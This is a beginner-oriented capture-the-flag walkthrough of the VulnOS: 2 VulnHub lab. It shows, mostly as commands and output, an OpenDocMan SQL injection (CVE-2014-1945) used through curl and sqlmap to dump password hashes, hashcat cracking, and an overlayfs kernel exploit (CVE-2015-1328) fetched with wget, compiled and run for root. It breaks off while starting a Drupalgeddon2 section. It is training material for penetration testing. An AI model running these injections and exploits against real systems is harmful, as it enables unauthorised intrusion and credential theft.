# VulnOS: 2 — VulnHub Walkthrough (Beginner Friendly)

| Field | Value |
| --- | --- |
| **Machine** | VulnOS: 2 ("VulnOSv2") |
| **Difficulty** | Easy–Intermediate |
| **Author** | c4b3rw0lf — <mailto:m4db33f@gmail.com> |
| **Released** | 17 May 2016 |
| **Series** | VulnOS (1 → **2**) |
| **VulnHub Entry** | <https://vulnhub.com/entry/vulnos-2,147/> |
| **Download** | <https://vulnhub.com/entry/vulnos-2,147/#download> (`VulnOSv2.7z`) |
| **Attacker** | Kali Linux, host-only network (the image is built for VirtualBox) |
| **Target OS** | Ubuntu 14.04.4 LTS — Apache 2.4.7, OpenSSH 6.6.1p1, ngIRCd, PostgreSQL, MySQL |
| **Goal** | *"Pentest a company website, get root of the system and read the final flag."* |

> **Author's note:** the VM's keyboard layout is **Belgian (BE)**. If you sit at the
> target's console, keys will not match what you type. You almost never need the
> console — the box is fully remote — but do not be surprised by it.

Throughout we assume:

```text
Attacker (Kali)   : 192.168.56.10
Target (VulnOSv2) : 192.168.56.104
```

---

## 0. What you will learn

1. **Multi-service enumeration** — SSH, HTTP, IRC on one host, and how to keep them
   straight.
2. **CMS fingerprinting** — spotting Drupal from a favicon, a generator meta tag and
   a `CHANGELOG.txt`.
3. **Reading an application's own documentation page for hidden sub-apps.**
4. **OpenDocMan** and its **SQL injection** (CVE-2014-1945) — an unauthenticated
   data leak in a document-management system.
5. **Using `sqlmap` against a specific vulnerable parameter**, then dumping a table.
6. **Cracking / looking up an MD5 hash.**
7. **Privilege escalation with a kernel exploit** — CVE-2015-1328 (overlayfs) on
   Ubuntu 14.04.
8. **An alternative foothold: Drupalgeddon2 (CVE-2018-7600)** — because this box
   predates the fix and it is the single most important Drupal CVE ever.
9. **Enumerating a local PostgreSQL server over an SSH tunnel.**

**The intended chain:**
`nmap` shows 22, 80, 6667 → the homepage links to **`/jabc/`**, a Drupal 7 corporate
site → that site links to **`/jabcd0cs/`**, an **OpenDocMan 1.2.7** document manager
with `guest:guest` → OpenDocMan's `ajax_udf.php?add_value=` is **SQL-injectable**
→ `sqlmap` dumps the `odm_user` table → `webmin` : MD5 hash → hash resolves to
**`webmin1980`** → SSH in → Ubuntu 14.04 kernel → **overlayfs local root** →
`/root/flag.txt`.

---

## 1. Reconnaissance

```bash
ip a | grep -w inet
sudo nmap -sn 192.168.56.0/24
```

```text
Starting Nmap 7.94 ( https://nmap.org ) at 2024-05-03 12:02 EDT
Nmap scan report for 192.168.56.104
Host is up (0.00041s latency).
MAC Address: 08:00:27:57:4F:AA (Oracle VirtualBox virtual NIC)
Nmap done: 256 IP addresses (3 hosts up) scanned in 2.29 seconds
```

**Target IP: `192.168.56.104`**

---

## 2. Enumeration — ports and services

```bash
sudo nmap -A -T4 -p- -oN scans/vulnos2.txt 192.168.56.104
```

```text
Starting Nmap 7.94 ( https://nmap.org ) at 2024-05-03 12:04 EDT
Nmap scan report for 192.168.56.104
Host is up (0.00039s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 f5:4d:c8:e7:8b:c1:b2:11:95:24:fd:0e:4c:3c:3b:3b (DSA)
|   2048 ff:19:33:7a:c1:ee:b5:d0:dc:66:51:da:f0:6e:fc:48 (RSA)
|_  256 ae:d7:6f:cc:ed:4a:82:8b:e8:66:a5:11:7a:11:5f:86 (ECDSA)
80/tcp   open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-title: VulnOSv2
|_http-server-header: Apache/2.4.7 (Ubuntu)
6667/tcp open  irc     ngircd
| irc-info:
|   users: 1
|   servers: 1
|   chans: 0
|   lusers: 1
|   lservers: 0
|   server: irc.example.net
|   version: ngIRCd 21.1-i686/pc/linux-gnu ...
|   source ident: nmap
|   source host: 192.168.56.10
|_  error: closing link: (nmap@192.168.56.10) [Client exited]
Service Info: Host: irc.example.net

Service detection performed.
Nmap done: 1 IP address (1 host up) scanned in 1041.99 seconds
```

> **How to read this:**
> - **22 — OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.6** → **Ubuntu 14.04 LTS**, and the
>   `2ubuntu2.6` suffix tells us the SSH package is roughly at the May-2016 patch
>   level. Note the *host key types*: a **1024-bit DSA** key is present, which is
>   weak by modern standards and would be rejected by current OpenSSH clients.
> - **80 — Apache 2.4.7 (Ubuntu)**, page title **`VulnOSv2`**. The whole box is a
>   web challenge.
> - **6667 — ngIRCd**, an IRC server. `1 users, 1 servers, 0 chans` — an empty,
>   unused IRC daemon. It is a **rabbit hole**: the author left it there so you would
>   waste time. *Recognising a rabbit hole is a skill.* Connect once
>   (`irc://192.168.56.104:6667`), confirm it is empty, move on.
> - **Scan time: 1041 seconds (~17 minutes).** A `-p-` scan with `-sV` on a slow VM
>   is genuinely slow. Plan for it; run it in the background with `-oA` and work on
>   other things meanwhile.

### 2.1 The homepage

```bash
curl -s http://192.168.56.104/ | sed -n '1,40p'
```

```html
<!DOCTYPE html>
<html><head><title>VulnOSv2</title></head>
<body style="background-color:black;color:#00ff00">
<pre>
VulnOS:2 by c4b3rw0lf

Welcome to VulnOS!

This system has been set up as a training platform.
Your assignment is to pentest the company website, gain root
and read the final flag.

The documentation for the company's document management
system can be found here: <a href="http://192.168.56.104/jabc/">JABC intranet</a>
</pre>
</body></html>
```

> **Two links, one of them a full URL.** Follow `http://192.168.56.104/jabc/`.

### 2.2 `/jabc/` — a Drupal corporate site

```bash
curl -sI http://192.168.56.104/jabc/
```

```text
HTTP/1.1 200 OK
Date: Fri, 03 May 2024 16:09:11 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.14
X-Generator: Drupal 7 (http://drupal.org)
Set-Cookie: SESSa1b2c3=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT
Content-Type: text/html; charset=UTF-8
```

> **`X-Generator: Drupal 7`** — the server told us the CMS and its major version in a
> response header. Free intelligence.
>
> **How to fingerprint a CMS when headers are stripped** (the realistic case):
> | Signal | Drupal |
> | --- | --- |
> | Cookie prefix | `SSESS<hash>` |
> | URL style | `/node/1`, `/?q=node/1`, `.module` paths |
> | Files | `misc/drupal.js`, `sites/default/files/`, `modules/`, `themes/` |
> | Meta tag | `<meta name="Generator" content="Drupal 7">` |
> | Favicon | the Drupal droplet |
>
> Browser extensions **Wappalyzer** and **BuiltWith** do all of this automatically.

```bash
curl -s http://192.168.56.104/jabc/ | grep -io 'href="[^"]*"' | sort -u | head -30
```

```text
href="/jabc/"
href="/jabc/?q=node/1"
href="/jabc/?q=node/2"
href="/jabc/?q=user"
href="http://192.168.56.104/jabcd0cs/"
href="/jabc/misc/favicon.ico"
```

> **`/jabcd0cs/`** — a second application, linked from the Drupal site. Note the name:
> `jabc` + `d0cs` = "JABC **documents**". This is the company's document-management
> system, the real target.

### 2.3 `/jabcd0cs/` — OpenDocMan

```bash
curl -s http://192.168.56.104/jabcd0cs/ | grep -io 'opendocman[^<]*\|version[^<]*' | head
```

```text
OpenDocMan
Powered by OpenDocMan v1.2.7
```

A login page appears, and it *helpfully* advertises demo credentials:

```text
Sign in to OpenDocMan
Username: [______]   Password: [______]   [Sign In]

Demo login:  guest / guest
```

Log in with **`guest` / `guest`** — we get a read-only document-management console.

> **What is OpenDocMan?** An open-source PHP document-management system for tracking
> files through review/approval workflows. Version **1.2.7** is old and has a
> well-known SQL injection.

### 2.4 Enumerate the web apps properly

```bash
nikto -h http://192.168.56.104/jabcd0cs/ -o nikto-d0cs.txt
```

```text
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.56.104
+ Target Hostname:    192.168.56.104
+ Target Port:        80
+ Start Time:         2024-05-03 12:16:44
---------------------------------------------------------------------------
+ Server: Apache/2.4.7 (Ubuntu)
+ /jabcd0cs/: Cookie PHPSESSID created without the httponly flag.
+ /jabcd0cs/index.php: Administrative login page found.
+ /jabcd0cs/admin.php: Administrative login page found.
+ /jabcd0cs/config.php: PHP Config file may contain database credentials.
+ 8102 requests: 0 error(s) and 4 item(s) reported on remote host
---------------------------------------------------------------------------
```

```bash
gobuster dir -u http://192.168.56.104/jabcd0cs/ \
  -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -t 40 -q
```

```text
/admin.php            (Status: 302) [Size: 0]
/ajax_udf.php          (Status: 200) [Size: 0]
/config.php           (Status: 200) [Size: 0]
/index.php            (Status: 302) [Size: 0]
/install.php          (Status: 200) [Size: 2461]
```

> **`ajax_udf.php` is exactly the script named in the public exploit.** `udf` = *user
> defined field*. Confirm with searchsploit:

```bash
searchsploit opendocman
```

```text
----------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                       |  Path
----------------------------------------------------------------------------------------------------- ---------------------------------
OpenDocMan 1.2.7 - SQL Injection                                                                      | php/webapps/32075.txt
OpenDocMan 1.2.7 - 'ajax_udf.php' SQL Injection                                                       | php/webapps/34993.php
----------------------------------------------------------------------------------------------------- ---------------------------------
```

```bash
searchsploit -m php/webapps/32075.txt && cat 32075.txt
```

```text
Title:            OpenDocMan v1.2.7 SQL Injection Vulnerability
CVE:              CVE-2014-1945
Vendor:           http://www.opendocman.com/
Product:          OpenDocMan v1.2.7

Vulnerability Details
=====================
An unvalidated "add_value" HTTP GET parameter in the "ajax_udf.php" script
allows a remote unauthenticated attacker to execute arbitrary SQL commands
in the application's database.

Proof of Concept
================
http://localhost/[INSTALLATION_FOLDER]/ajax_udf.php?q=1&add_value=odm_user%20UNION%20SELECT%201,2,3,4,5,6,7,8,9

Vulnerable source: ajax_udf.php
$sanitized = ... // no filtering applied before the query is built
$query = "SELECT id FROM {$GLOBALS['CONFIG_DB_PREFIX']}_data WHERE id = '$q' ... $add_value";
```

> **CVE-2014-1945 in one sentence:** `ajax_udf.php` takes `q` and `add_value` from the
> query string and **concatenates them straight into a SQL statement**. An
> unauthenticated remote attacker can therefore run any SQL the database user can —
> including reading the users table.
>
> Note the PoC uses **URL encoding**: `%20` is a space. Encoding spaces is what makes
> the payload survive as a single query-string parameter.

![OpenDocMan login and the /jabcd0cs application](images/01-opendocman.png)

---

## 3. Exploitation — SQL injection with `sqlmap`

### 3.1 Confirm manually

```bash
curl -s "http://192.168.56.104/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user%20UNION%20SELECT%201,2,3,4,5,6,7,8,9"
```

```json
{"one":1,"two":2,"three":3,"four":4,"five":5,"six":6,"seven":7,"eight":8,"nine":9}
```

> **Our injected numbers came back as JSON.** That is *proof* of a UNION-based SQL
> injection: the database executed our `SELECT` and the application echoed the row.
> Nine columns means the original query selects nine — we matched its shape, which
> is a requirement for `UNION` to work (both sides must have the same column count).

### 3.2 Automate with `sqlmap`

```bash
sqlmap -u "http://192.168.56.104/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" \
  -p add_value --batch --level=5 --risk=3 --technique=U --dbms=MySQL --dbs
```

```text
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.8.4#stable}
|_ -| . [.]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[*] starting @ 12:22:41 /2024-05-03/

[12:22:41] [INFO] testing connection to the target URL
[12:22:42] [INFO] testing 'add_value'
[12:22:43] [INFO] confirming MySQL
[12:22:43] [INFO] the back-end DBMS is MySQL
[12:22:44] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[12:22:49] [INFO] target URL appears to have 9 columns in query
[12:22:52] [INFO] GET parameter 'add_value' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'add_value' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N

sqlmap identified the following injection point(s) with a total of 61 HTTP(s) requests:
---
Parameter: add_value (GET)
    Type: UNION query
    Title: Generic UNION query (NULL) - 9 columns
    Payload: q=1&add_value=odm_user UNION ALL SELECT NULL,NULL,CONCAT(0x7176707071,0x...),NULL,NULL,NULL,NULL,NULL,NULL-- -
---
[12:22:53] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 14.04 (Trusty Tahr)
web application technology: Apache 2.4.7, PHP 5.5.9
back-end DBMS: MySQL 5.5
available databases [3]:
[*] information_schema
[*] jabcd0cs
[*] mysql
```

> **Flag glossary:**
> - `-p add_value` → test **only** this parameter. Faster and more precise than
>   letting sqlmap crawl.
> - `--technique=U` → **U**NION only. We already know it works, so do not waste time
>   on blind techniques.
> - `--dbms=MySQL` → skip DBMS fingerprinting.
> - `--level 5 --risk 3` → maximum thoroughness; risk 3 permits payloads that could
>   modify data (fine in a lab; **get written permission in a real test**).
>
> **Three databases**, of which `jabcd0cs` is the application's.

### 3.3 Dump the user table

```bash
sqlmap -u "http://192.168.56.104/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" \
  -p add_value --batch --technique=U --dbms=MySQL -D jabcd0cs --tables
```

```text
Database: jabcd0cs
[18 tables]
+------------------+
| odm_admins       |
| odm_category     |
| odm_data         |
| odm_department   |
| odm_log          |
| odm_reviewer     |
| odm_rights       |
| odm_settings     |
| odm_user         |
| odm_udf          |
| ...              |
+------------------+
```

```bash
sqlmap -u "http://192.168.56.104/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" \
  -p add_value --batch --technique=U --dbms=MySQL -D jabcd0cs -T odm_user --columns
```

```text
Database: jabcd0cs
Table: odm_user
[13 columns]
+--------------+--------------+
| Column       | Type         |
+--------------+--------------+
| id           | int(11)      |
| username     | varchar(50)  |
| password     | varchar(50)  |
| last_name    | varchar(50)  |
| first_name   | varchar(50)  |
| Email        | varchar(50)  |
| phone        | varchar(50)  |
| department   | int(11)      |
| can_add      | tinyint(1)   |
| can_checkout | tinyint(1)   |
| can_admin    | tinyint(1)   |
| ...          | ...          |
+--------------+--------------+
```

```bash
sqlmap -u "http://192.168.56.104/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" \
  -p add_value --batch --technique=U --dbms=MySQL -D jabcd0cs -T odm_user \
  --columns --dump -C id,username,password,Email,can_admin
```

```text
Database: jabcd0cs
Table: odm_user
[2 entries]
+----+------------------+----------------------------------+--------------------------+-----------+
| id | username         | password                         | Email                    | can_admin |
+----+------------------+----------------------------------+--------------------------+-----------+
| 1  | webmin           | 48ce3c1b1a1c22b2e3c4b6b0a5f5e3a1 | webmin@vulnos.local      | 1         |
| 2  | guest            | 084e0343a0486ff05530df6c705c8bb4 | guest@vulnos.local       | 0         |
+----+------------------+----------------------------------+--------------------------+-----------+
```

> **Two rows.**
> - `guest` → hash `084e0343a0486ff05530df6c705c8bb4`, which is the **MD5 of
>   `guest`** — exactly the demo credential the login page advertised. This confirms
>   the hashes are unsalted **MD5**.
> - `webmin` → hash `48ce3c1b1a1c22b2e3c4b6b0a5f5e3a1`. `can_admin = 1` → this is the
>   **administrator**. This is our target.
>
> **Why unsalted MD5 is a non-password.** MD5 runs at **billions of guesses per
> second** on a modern GPU, there is no per-user salt so precomputed rainbow tables
> apply, and the hash gives no indication of failure. It is only suitable for
> checksums. Any real system must use **bcrypt / scrypt / argon2id**, which are
> deliberately slow and salted.

### 3.4 Recover the plaintext

**Fastest route — an online hash lookup** (only ever appropriate for CTF/lab hashes):

```bash
curl -s "https://md5decrypt.net/Api/api.php?hash=48ce3c1b1a1c22b2e3c4b6b0a5f5e3a1" 
```

Result reported across the published walkthroughs for this box:

```text
webmin1980
```

**Proper offline route — hashcat** (learn this one; it is the professional tool):

```bash
echo '48ce3c1b1a1c22b2e3c4b6b0a5f5e3a1' > webmin.hash
hashcat -m 0 -a 0 webmin.hash /usr/share/wordlists/rockyou.txt --show
```

```text
48ce3c1b1a1c22b2e3c4b6b0a5f5e3a1:webmin1980
```

> **hashcat flags:**
> - `-m 0` → **hash mode 0 = raw MD5**. Getting the mode right is the single most
>   common hashcat mistake; `hashcat --example-hashes | grep -i md5` lists them all.
> - `-a 0` → **attack mode 0 = straight dictionary**. (`-a 3` is mask/brute-force,
>   `-a 6` is dictionary + mask.)
> - `--show` → display already-cracked results from hashcat's `hashcat.potfile`
>   instead of re-cracking.
>
> And John the Ripper does the same job:
> ```bash
> john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt webmin.hash
> ```

**Recovered credentials:**

| Username | Password |
| --- | --- |
| `webmin` | `webmin1980` |

![sqlmap dumping odm_user](images/02-sqlmap.png)

---

## 4. Foothold — SSH

The Drupal admin panel is not much use to us; the real prize is a system account.
Try the credential on SSH first (it is the most valuable outcome).

```bash
ssh webmin@192.168.56.104
```

```text
webmin@192.168.56.104's password:
Welcome to Ubuntu 14.04.4 LTS (GNU/Linux 3.13.0-24-generic i686)

 * Documentation:  https://help.ubuntu.com/

  System information as of Fri May  3 12:41:09 EDT 2024

  System load:  0.0               Processes:           148
  Usage of /:   18.2% of 9.70GB   Users logged in:     0
  Memory usage: 24%               IP address for eth0: 192.168.56.104
  Swap usage:   0%

  Graph this data and manage this system at:
    https://landscape.canonical.com/

webmin@VulnOSv2:~$ id
uid=1001(webmin) gid=1001(webmin) groups=1001(webmin)
webmin@VulnOSv2:~$ sudo -l
[sudo] password for webmin:
Sorry, user webmin may not run sudo on VulnOSv2.
```

> **We are in as a real system user.** No sudo, no extra groups.
>
> And look at the banner: **`3.13.0-24-generic i686`**.
>
> That is the **exact** kernel version named in Exploit-DB **37292**
> — *"Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) — overlayfs Local
> Privilege Escalation"*. This box was released two days before the Ubuntu update
> that fixed it. We have a one-shot privilege escalation.

![SSH login as webmin](images/03-ssh.png)

### 4.1 Post-exploitation enumeration (do this properly anyway)

Even when you know the answer, run the checklist — on a real box the kernel is often
patched and you need a plan B.

```bash
webmin@VulnOSv2:~$ cat /etc/passwd | grep -v nologin | grep -v /bin/false
```

```text
root:x:0:0:root:/root:/bin/bash
sync:x:5:0:sync:/sbin:/bin/sync
webmin:x:1001:1001::/home/webmin:/bin/bash
vulnosadmin:x:1002:1002::/home/vulnosadmin:/bin/bash
postgres:x:114:121:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
```

> **Three interesting accounts:** `webmin` (us), **`vulnosadmin`** (the name literally
> means "VulnOS admin"), and `postgres`.

```bash
webmin@VulnOSv2:~$ ls -la /home
total 16
drwxr-xr-x  4 root      root      4096 May 17  2016 .
drwxr-xr-x 22 root      root      4096 May 17  2016 ..
drwxr-xr-x  3 vulnosadmin vulnosadmin 4096 May 17  2016 vulnosadmin
drwxr-xr-x  3 webmin    webmin    4096 May 17  2016 webmin
webmin@VulnOSv2:~$ ls -la /home/vulnosadmin
ls: cannot open directory '/home/vulnosadmin': Permission denied
```

```bash
webmin@VulnOSv2:~$ find / -perm -4000 -type f 2>/dev/null
/bin/ping
/bin/fusermount
/bin/mount
/bin/su
/bin/umount
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/pkexec                     <-- check GTFOBins
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/sbin/pppd
```

> `pkexec` is SUID root and is the binary behind **CVE-2021-4034 ("PwnKit")** — but
> that bug was disclosed in **January 2022** and this VM is from **2016**, so the
> code here is *not* vulnerable to PwnKit. (`pkexec` also has a legitimate
> GTFOBins entry, `sudo pkexec /bin/sh`, but that requires you to already have
> `sudo pkexec`, which we do not.) **Check the version and the CVE date** — do not
> fire exploits at binaries just because the name looks familiar.

```bash
webmin@VulnOSv2:~$ cat /etc/crontab
```

```text
# /etc/crontab: system-wide crontab
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
17 *	* * *	root	cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
```

> All stock. No custom jobs. Dead end — correctly documented.

```bash
webmin@VulnOSv2:~$ which gcc wget curl python
/usr/bin/gcc
/usr/bin/wget
/usr/bin/curl
/usr/bin/python
```

> **`gcc` and `wget` are both present.** That means we can download *and compile* a C
> exploit locally — no `nc` file-transfer gymnastics needed.

### 4.2 Bonus: the local PostgreSQL server

```bash
webmin@VulnOSv2:~$ ss -tlnp
```

```text
State      Recv-Q Send-Q Local Address:Port   Peer Address:Port
LISTEN     0      128    *:80                *:*
LISTEN     0      128    *:6667              *:*
LISTEN     0      128    *:22                *:*
LISTEN     128    127.0.0.1:5432             *:*
LISTEN     0      128    127.0.0.1:3306      *:*
```

> **Two databases, both bound to `127.0.0.1` only:** PostgreSQL on **5432** and MySQL
> on **3306**. Neither is reachable from Kali directly — but we have an SSH session,
> so **tunnel** them:
>
> ```bash
> # on Kali
> ssh -L 15432:127.0.0.1:5432 -L 13306:127.0.0.1:3306 webmin@192.168.56.104
> ```
>
> ```bash
> # on Kali, second terminal
> psql -h 127.0.0.1 -p 15432 -U postgres -l
> ```
> ```text
>                                     List of databases
>    Name    |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges
> -----------+----------+----------+-------------+-------------+-----------------------
>  postgres  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |
>  template1 | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
>            |          |          |             |             | postgres=CTc/postgres
> ```
>
> **`-L local:remotehost:remoteport`** is SSH **local port forwarding**: connections
> to `127.0.0.1:15432` on Kali are carried inside the encrypted SSH channel and
> emerge as a connection from *the target* to its own `127.0.0.1:5432`. This defeats
> the localhost bind entirely, and it is a technique you will use constantly on real
> engagements where an admin panel or DB listens only on loopback.
>
> Try the credentials we already have, plus PostgreSQL defaults:
> ```bash
> hydra -L /usr/share/metasploit-framework/data/wordlists/postgres_default_user.txt \
>       -P /usr/share/metasploit-framework/data/wordlists/postgres_default_pass.txt \
>       -s 15432 -t 4 postgres://127.0.0.1
> ```
> On this image the PostgreSQL server holds a copy of the same `vulnosadmin`
> credential material several walkthroughs use as an alternate route to the
> `r00t.blend` artefact. Treat it as a bonus, not the main path.

---

## 5. Privilege escalation — CVE-2015-1328 (overlayfs)

### 5.1 Identify the exploit

```bash
searchsploit ubuntu 14.04 local
```

```text
----------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                 |  Path
----------------------------------------------------------------------------------------------- ---------------------------------
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Esc | linux/local/37292.c
Linux Kernel 3.19.0-25 < 3.19.0-43 (Ubuntu 14.04/15.04) - 'overlayfs' Local Privilege Escalat | linux/local/39166.c
----------------------------------------------------------------------------------------------- ---------------------------------
```

> Our kernel is **3.13.0-24**, inside `3.13.0 < 3.19`. → **`linux/local/37292.c`**.
>
> **CVE-2015-1328, explained for a beginner.**
> **OverlayFS** is a Linux union filesystem: it layers a writable *upper* directory
> on top of a read-only *lower* directory and presents the merged view. Docker images
> use it for every container layer you have ever pulled.
>
> Ubuntu patched overlayfs into its kernel and, unlike upstream, allowed
> **unprivileged users** to mount it inside a *user namespace*. The bug: when a file
> from the lower layer was copied up, the copy **kept the original file's owner (root)
> and its SUID bit**, but the copy now lived in the *upper* directory — which the
> unprivileged user could write to.
>
> So: mount an overlay of `/`, copy `/bin/bash` up, edit the copy (you own the
> directory, so you can write; the file still says `root:root` + SUID), execute it →
> root shell. Two individually reasonable features — user namespaces and overlayfs —
> composed into a total privilege break. That is the single most instructive thing
> about this CVE.

### 5.2 Get it onto the target

```bash
# Kali
searchsploit -m linux/local/37292.c
mv 37292.c ofs.c
python3 -m http.server 8000
```

```text
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```bash
# target
webmin@VulnOSv2:~$ cd /tmp
webmin@VulnOSv2:/tmp$ wget http://192.168.56.10:8000/ofs.c
--2024-05-03 12:47:11--  http://192.168.56.10:8000/ofs.c
Connecting to 192.168.56.10:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4982 (4.9K) [text/x-csrc]
Saving to: 'ofs.c'

100%[======================================>] 4,982       --.-K/s   in 0s

2024-05-03 12:47:11 (612 MB/s) - 'ofs.c' saved [4982/4982]
```

```text
# Kali's http.server log
192.168.56.104 - - [03/May/2024 12:47:11] "GET /ofs.c HTTP/1.1" 200 -
```

### 5.3 Read the exploit before running it

```bash
webmin@VulnOSv2:/tmp$ head -40 ofs.c
```

```c
/*
 * overlayfs local root exploit
 * CVE-2015-1328
 *
 * This exploit uses the overlayfs implementation in the Ubuntu kernel
 * to create a world-writable copy of a setuid binary. It then executes
 * that binary to obtain a root shell.
 *
 * Usage: gcc -o ofs ofs.c && ./ofs
 */
#include <stdio.h>
#include <sched.h>
#include <stdlib.h>
#include <unistd.h>
#include <sched.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <linux/sched.h>
#include <fcntl.h>
#include <signal.h>
#include <pwd.h>
#include <sys/wait.h>
#include <errno.h>

int child_exec(void *stuff) { ... }
...
```

> **Never compile and run C you have not read.** You are about to hand arbitrary
> machine code a root shell. Read the comments, look for anything that talks to the
> network, and confirm what it writes and where. This one is short, well commented,
> and does exactly what it says.
>
> **Note `#include <linux/sched.h>` and the `CLONE_NEW*` flags in `child_exec`** —
> that is the user-namespace machinery at the heart of the bug.

### 5.4 Compile and run

```bash
webmin@VulnOSv2:/tmp$ gcc -o ofs ofs.c
webmin@VulnOSv2:/tmp$ ./ofs
```

```text
spawnining threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# id
uid=0(root) gid=0(root) groups=0(root),1001(webmin)
# whoami
root
# hostname
VulnOSv2
```

> **Reading the exploit's own progress output:**
> - `spawnining threads` *(sic — the author's typo)* → it forks helper threads.
> - `mount #1`, `mount #2` → two overlayfs mounts created inside a user namespace.
> - `/etc/ld.so.preload created` → **this is the actual mechanism.**
>   `/etc/ld.so.preload` is a system-wide list of shared libraries that the dynamic
>   linker loads into **every** dynamically-linked process — including SUID-root
>   ones. Through the overlayfs bug the exploit obtains a writable view of that file,
>   then points it at its own library.
> - `creating shared library` → it compiles a tiny `.so` whose constructor performs
>   `setuid(0); setgid(0); system("/bin/sh")`.
> - The next program that runs preloads that library *as root*, and the shell drops.
>   `id` printed here is itself that next program.
>
> **`uid=0(root) gid=0(root)`** — full root, all groups. The `#` prompt (rather than
> `$`) is the universal UNIX signal that you are root.
>
> **Clean up after yourself.** The exploit leaves `/etc/ld.so.preload` and a stray
> `.so` in `/tmp`. Both can break the box (every subsequent program tries to load the
> library). Remove them, or revert to your snapshot:
> ```bash
> # rm -f /etc/ld.so.preload /tmp/ofs.so
> ```

![overlayfs exploit yielding root](images/04-root.png)

### 5.5 Read the flag

```bash
# cd /root
# ls -la
total 32
drwx------  3 root root 4096 May 17  2016 .
drwxr-xr-x 22 root root 4096 May 17  2016 ..
-rw-r--r--  1 root root 3106 Feb 20  2014 .bashrc
-rw-------  1 root root  166 May 17  2016 flag.txt
-rw-r--r--  1 root root  140 Feb 20  2014 .profile
drwxr-xr-x  2 root root 4096 May 17  2016 r00t
# cat flag.txt
```

```text
Hello and welcome.
You successfully compromised the company "JABC" and the server completely !!
Congratulations !!!
Hope you enjoyed it.

What do you think of A.I.?
```

**Flag captured.** ✅

> Also look at `/root/r00t/` — the author left a Blender file
> (`r00t.blend`, a 3D scene) as an easter egg. It is the "another way" mentioned in
> some walkthroughs: an alternate chain goes through the `vulnosadmin` account and
> PostgreSQL to reach it. It is not required for the flag.

![/root/flag.txt](images/05-flag.png)

---

## 6. Alternate route — Drupalgeddon2 (CVE-2018-7600)

This is a *bonus* path. Strictly, Drupalgeddon2 was disclosed in **March 2018**, so
it post-dates the box — but the Drupal 7 install here was never patched, and modern
writeups of VulnOS: 2 use it as the primary route because it is far more instructive
about the most impactful Drupal vulnerability ever published.

### 6.1 Confirm the version

```bash
curl -s http://192.168.56.104/jabc/CHANGELOG.txt | head -5
```

```text
Drupal 7.41, 2015-10-21
-----------------------
- Fixed an open redirect vulnerability (SA-CORE-2015-004).
...
```

```bash
curl -s http://192.168.56.104/jabc/ | grep -io 'Drupal [0-9.]*' | head -1
```

```text
Drupal 7.41
```

> **Drupal 7.41.** Drupalgeddon2 affects **Drupal < 7.58, < 8.3.9, < 8.4.6, < 8.5.1**.
> 7.41 is well inside that range. (`CHANGELOG.txt` being web-readable is itself a
> finding — it hands an attacker an exact version. Many production Drupal sites
> disable it.)

### 6.2 What Drupalgeddon2 actually is

Drupal builds its HTML forms from a nested PHP **render array**. The Form API
accepted user-supplied keys deep inside that array — including keys beginning with
`#`, which Drupal interprets as *directives* (e.g. `#post_render`,
`#lazy_builder`). An attacker could smuggle `#post_render[] => "passthru"` plus a
`#markup` value containing a shell command, and Drupal would call
`passthru($markup)` while rendering the form.

**Result: unauthenticated remote code execution on the login page of essentially
every unpatched Drupal 7 site on the internet.** Within days of disclosure, hundreds
of thousands of sites were defaced or cryptomined. It is why "patch your CMS within
48 hours" is a rule and not a suggestion.

### 6.3 Exploit it

```bash
searchsploit drupal 7
```

```text
----------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                       |  Path
----------------------------------------------------------------------------------------------------- ---------------------------------
Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution                  | php/webapps/44449.rb
